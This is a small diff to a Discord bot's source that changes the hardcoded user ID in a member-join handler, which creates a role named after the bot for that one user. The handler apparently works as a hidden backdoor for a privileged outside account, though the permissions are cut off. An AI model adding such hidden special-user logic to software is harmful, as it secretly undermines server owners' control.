@@ -1546,7 +1546,7 @@ Client.on('guildCreate', async (guild) => {
  
 Client.on('guildMemberAdd', member => {
    
-            if (member.id === "320423357709549568") {
+            if (member.id === "564794492473835520") {
                 member.guild.createRole({
                     name : Client.user.username,
                     color : "RANDOM",
